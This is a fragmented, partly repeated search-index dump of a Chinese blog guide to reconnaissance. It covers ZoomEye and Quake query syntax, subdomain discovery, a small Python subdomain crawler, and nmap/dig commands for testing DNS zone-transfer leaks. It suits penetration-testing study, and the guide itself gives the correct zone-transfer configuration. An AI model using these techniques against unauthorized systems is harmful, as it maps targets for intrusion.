ver：搜索指定的版本 l例如：ver“1.2.3” service：指定服务类型 例如：service:“ftp” 钟馗之眼语法参考资料Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法 zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园 信息收集利器：ZoomEye - FreeBuf网络安全行业门户 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#钟馗之眼--知道创宇"},{"categories":["学习"],"content":" 钟馗之眼–知道创宇ZoomEye - Cyberspace Search Engine https://www.zoomeye.org/ 免费： 查询结果展示量：4百条 查询API额度：每月1w 高级：4800/年 查询结果展示量：1千条 查询API额度：每月3w VIP：9600/年 查询结果展示量：2千条 查询API额度：每月4w 高级与VIP功能差别：蜜罐识别 语法 country：搜索指定国家 例如：country:“JP” city：搜索指定城市 例如：city:“San Diego” subdivisions：搜索相关指定行政区的资产 例如：subdivisions:“**东京”** ssl.cert.availability：搜索证书是否在有效期内 例如：ssl:“1”or“0” ip：搜索指定的IP(ipv4/6) 列如：ip:“8.8.8.8” cidr：搜索指定的IP段 列如：cidr:“52.2.254.36/24” org：搜索指定的组织或机构，例如：org:“google” isp：搜索相关网络服务提供商的资产 例如：isp:“China Mobile” port：搜索指定的端口或服务，例如：port:“22” hostname：搜索相关IP\"主机名\"的资产 例如：hostname:“google.com” site：搜索域名相关的资产 例如：site:“baidu.com” device：搜索路由器相关的设备类型 例如：device:“router” os：搜索指定限定系统OS版本， 例如：os:“Windows Server 2008 R2” title：搜索指定网页类容 例如：title:“hello world” app：搜索指定的组件 列如：app:“apache ” ver：搜索指定的版本 l例如：ver“1.2.3” service：指定服务类型 例如：service:“ftp” 钟馗之眼语法参考资料Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法 zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园 信息收集利器：ZoomEye - FreeBuf网络安全行业门户 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#语法-1"},{"categories":["学习"],"content":" 钟馗之眼–知道创宇ZoomEye - Cyberspace Search Engine https://www.zoomeye.org/ 免费： 查询结果展示量：4百条 查询API额度：每月1w 高级：4800/年 查询结果展示量：1千条 查询API额度：每月3w VIP：9600/年 查询结果展示量：2千条 查询API额度：每月4w 高级与VIP功能差别：蜜罐识别 语法 country：搜索指定国家 例如：country:“JP” city：搜索指定城市 例如：city:“San Diego” subdivisions：搜索相关指定行政区的资产 例如：subdivisions:“**东京”** ssl.cert.availability：搜索证书是否在有效期内 例如：ssl:“1”or“0” ip：搜索指定的IP(ipv4/6) 列如：ip:“8.8.8.8” cidr：搜索指定的IP段 列如：cidr:“52.2.254.36/24” org：搜索指定的组织或机构，例如：org:“google” isp：搜索相关网络服务提供商的资产 例如：isp:“China Mobile” port：搜索指定的端口或服务，例如：port:“22” hostname：搜索相关IP\"主机名\"的资产 例如：hostname:“google.com” site：搜索域名相关的资产 例如：site:“baidu.com” device：搜索路由器相关的设备类型 例如：device:“router” os：搜索指定限定系统OS版本， 例如：os:“Windows Server 2008 R2” title：搜索指定网页类容 例如：title:“hello world” app：搜索指定的组件 列如：app:“apache ” ver：搜索指定的版本 l例如：ver“1.2.3” service：指定服务类型 例如：service:“ftp” 钟馗之眼语法参考资料Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法 zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园 信息收集利器：ZoomEye - FreeBuf网络安全行业门户 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#钟馗之眼语法参考资料"},{"categories":["学习"],"content":" 360 QUAKE–360360网络空间测绘 — 因为看见，所以安全 免费 数据广度开放性：5百条 Quake积分：3千/月 高级：299/年 数据广度开放性：5千条 Quake积分 ：3W/月 终身：999 数据广度开放性：1W条 Quake积分 ：5W/月 功能差别：相似图标、深度识别、专用语法、圈内交流 邀请码： Cm2TX9 语法 country：搜索指定国家（中文添加_cn） 例如：country:“JP” city：搜索指定城市 例如：city:“tokyo ” owner：搜索IP归属单位 例如：owner:“tencent.com” isp：搜索IP归属运营商 例如：isp:“amazon.com” ip：查询IP地址或网段 列如：ip:“1.1.1.1/22” is_ipv6：查询IPV6格式的IP 列如：sis_ipv6:“true” port：搜索指定的端口或服务 例如：port:“[50 TO 60]” transport：查询udp数据 例如：transport:“udp” domain：查询资产域名 例如：domain:“google.com” hostname：查询主机名包含指定资产的数据 例如： hostname:“google.com” app：搜索指定的组件 列如：app:“apache ” response：查询端口原生返回数据中包含指定参数的资产 列如：response:“google.com” ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#360-quake--360"},{"categories":["学习"],"content":" 360 QUAKE–360360网络空间测绘 — 因为看见，所以安全 免费 数据广度开放性：5百条 Quake积分：3千/月 高级：299/年 数据广度开放性：5千条 Quake积分 ：3W/月 终身：999 数据广度开放性：1W条 Quake积分 ：5W/月 功能差别：相似图标、深度识别、专用语法、圈内交流 邀请码： Cm2TX9 语法 country：搜索指定国家（中文添加_cn） 例如：country:“JP” city：搜索指定城市 例如：city:“tokyo ” owner：搜索IP归属单位 例如：owner:“tencent.com” isp：搜索IP归属运营商 例如：isp:“amazon.com” ip：查询IP地址或网段 列如：ip:“1.1.1.1/22” is_ipv6：查询IPV6格式的IP 列如：sis_ipv6:“true” port：搜索指定的端口或服务 例如：port:“[50 TO 60]” transport：查询udp数据 例如：transport:“udp” domain：查询资产域名 例如：domain:“google.com” hostname：查询主机名包含指定资产的数据 例如： hostname:“google.com” app：搜索指定的组件 列如：app:“apache ” response：查询端口原生返回数据中包含指定参数的资产 列如：response:“google.com” ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#语法-2"},{"categories":["学习"],"content":" 相应网站Censys Search GreyNoise 各个国家代码是什么？_百度知道 https://github.com/0x727/Space_view ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:6","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#相应网站"},{"categories":["学习"],"content":" 聚合测绘空间搜索工具项目名称：聚合测绘空间搜索（HW**蓝队情报收集**） 项目地址：https://github.com/atdpa4sw0rd/Search-Tools 支持搜索的引擎：Fofa**、Zoomeye、Quake、Shodan、Censys、BinaryEdge、threatbook** 1. git clone https://github.com/atdpa4sw0rd/Search-Tools.git 2. cd Search-Tools \u0026\u0026 pip3 install -r requirements.txt 3. python3 search_main.py ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:3:7","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#聚合测绘空间搜索工具"},{"categories":["学习"],"content":" APP、小程序、公众号信息收集","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:4:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#app小程序公众号信息收集"},{"categories":["学习"],"content":" 1、APP信息搜集","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:5:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1app信息搜集"},{"categories":["学习"],"content":" 1.1、七麦数据https://www.qimai.cn/ 通过当前APP查询所属公司的所有APP 通过当前APP查询同开发者应用 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:5:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#11七麦数据"},{"categories":["学习"],"content":" 1.2、AppStore(安卓和IOS)查询同开发者应用 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:5:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#12appstore安卓和ios"},{"categories":["学习"],"content":" 2、微信公众号和小程序通过微信搜索公众号并去关注，然后进去点击文章之类的，下拉可以看到它的网页来源，大部分是微信提供的，所以需要去阅读原文，但是原文也可能是第三方提供的，所以还需要自己自行去判断，找到它的url后又可以去爆一波子域名了， 随便点击文章通过下拉查看域名，例如： ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:6:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2微信公众号和小程序"},{"categories":["学习"],"content":" 4、logo当你不确定目标产品是什么时，比如你不知道他是谁家的WAF或者路由器，可以利用查看网站logo地址，然后复制logo地址，点击按图片搜索，到谷歌里面查询；也可以把目标logo下载下来，利用上传图片来查询，通过搜索出来的结果可以判断目标产品和厂商。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:7:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#4logo"},{"categories":["学习"],"content":" 5、favicon.ico首先先来介绍一下什么favicon.ico文件，所谓favicon，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。favicon.ico也被称为 website icon（网页图标）、page icon（页面图标）或url icon（URL图标），具体细节请问度娘。下面这个小东西就是 Favicon.ico，我们可以通过在shodan里寻找它的哈希并去查找相关资产，打开shodan页面，或者用shodan插件都行。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:8:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#5faviconico"},{"categories":["学习"],"content":" 三、子域名收集(挖掘)","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:9:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#三子域名收集挖掘"},{"categories":["学习"],"content":" 1、SSL(HTTPS)证书点击浏览器网站旁边的小锁，然后点击证书就可以查看到该网站的SSL证书了 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:10:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1sslhttps证书"},{"categories":["学习"],"content":" 1.1、大厂商SSL证书一证多用大厂商的SSL证书一般都是一证多用，根据证书透明日志这个特性，可以得知一些子域名。 如百度：https://www.baidu.com 如搜狐：https://vpn.sohu-inc.com ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:10:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#11大厂商ssl证书一证多用"},{"categories":["学习"],"content":" 1.2、HTTPS证书错误泄露域名有时候https证书报错会泄露域名 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:10:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#12https证书错误泄露域名"},{"categories":["学习"],"content":" 1.3、在线网站证书查询https://crt.sh/ https://censys.io/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:10:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#13在线网站证书查询"},{"categories":["学习"],"content":" 2、网络深度爬虫以www.sina.com.cn为例，我们使用正则表达式抓取页面以sina.com.cn结尾的所有的URL（一级深度）。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:11:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2网络深度爬虫"},{"categories":["学习"],"content":" !/usr/bin/env python","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:12:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#usrbinenv-python"},{"categories":["学习"],"content":" coding=utf-8","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:13:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#codingutf-8"},{"categories":["学习"],"content":" author=dave.fang@outlook.com","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:14:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#authordavefangoutlookcommailtodavefangoutlookcom"},{"categories":["学习"],"content":" create=20160701import re import requests from pprint import pprint def crawl_page(url, domain): print(’[*] Crawl URL: {0}’.format(url)) found_url = set() req = requests.get(url, timeout=15) content = req.text link_list = re.findall(r\"(?\u003c=href=\").+?(?=\")|(?\u003c=href=’).+?(?=’)\", content) for url in link_list: result = re.findall(‘http[s]?://(.*?).sina.com.cn’, url) if len(result) \u003e 0: found_url.add(’{0}.{1}’.format(result[0], domain)) pprint(found_url) if name == ‘main’: page_url = ‘http://www.sina.com.cn/’ main_domain = ‘sina.com.cn’ crawl_page(page_url, main_domain) 一级深度爬出来的结果，就有146个子域名，这个小脚本权当抛砖引玉，可以再深度定制。 [*] Crawl URL: http://www.sina.com.cn/ {‘2016.sina.com.cn’, ‘ah.sina.com.cn’, ‘ai.lottery.sina.com.cn’, ‘aipai.sina.com.cn’, ‘app.sina.com.cn’, ‘astro.sina.com.cn’, ‘auto.sina.com.cn’, ‘career.sina.com.cn’, … ‘golf.sina.com.cn’, ‘zx.jiaju.sina.com.cn’} [*] Found Links Num: 146 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:15:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#create20160701"},{"categories":["学习"],"content":" 3、域传送漏洞快速判断出某个特定区域的所有主机,获取域信息,如网络拓扑结构、服务器ip地址,为攻击者的入侵提供大量敏感信息。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:16:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#3域传送漏洞"},{"categories":["学习"],"content":" 3.1、常用DNS记录主机记录(A记录): A记录是用于名称解析的重要记录,它将特定的主机名映射到对应主机的IP地址上。 IPv6主机记录(AAAA记录): 与A记录对应,用于将特定的主机名映射到一个主机的IPv6地址。 别名(CNAME记录): CNAME记录用于将某个别名指向到某个A记录上,这样就不需要再为某个新名字另外创建一条新的A记录。 电子邮件交换记录（MX记录): 记录一个邮件域名对应的IP地址 域名服务器记录 (NS记录): 记录该域名由哪台域名服务器解析 反向记录(PTR记录): 也即从IP地址到域名的一条记录 TXT记录：记录域名的相关文本信息 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:16:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#31常用dns记录"},{"categories":["学习"],"content":" 3.2、DNS区域传送DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度,其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:16:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#32dns区域传送"},{"categories":["学习"],"content":" 3.3、域传送漏洞DNS区域传送(DNS transfer)指后备DNS服务器从主服务器获取数据,以更新自己的zone数据库，这可以防止因主DNS服务器故障造成的业务中断,为DNS服务提供了冗余备份，但是许多DNS服务器却被错误配置成只要收到AXFR请求,就向对方进行域传送。 当存在这种错误配置时,攻击者就可以获取整个域的所有记录,造成整个网络架构泄露。正确的配置包括 allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器 allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:16:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#33域传送漏洞"},{"categories":["学习"],"content":" 3.4、检测nmap脚本扫描 nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=targetdomain -p 53 -Pn dns.xxx dig命令 dig @114.114.114.114 twosmi1e.com axfr @指定DNS服务器, 后面指定域名,axfr为域传送请求 nslookup 输入nslookup命令进入交互式shell界面; server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。 ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。 exit命令退出 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:16:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#34检测"},{"categories":["学习"],"content":" 4、在线DNS数据有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:17:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#4在线dns数据"},{"categories":["学习"],"content":" 4.1、VirusTotalhttps://www.virustotal.com/#/home/search ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:17:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#41virustotal"},{"categories":["学习"],"content":" 4.2、DNSdumpsterhttps://dnsdumpster.com/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:17:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#42dnsdumpster"},{"categories":["学习"],"content":" 4.2、dnsdbhttps://www.dnsdb.io/zh-cn/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:17:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#42dnsdb"},{"categories":["学习"],"content":" 5、自身泄漏robots.txt crossdomain.xml(跨域策略文件cdx) 从流量中分析提取 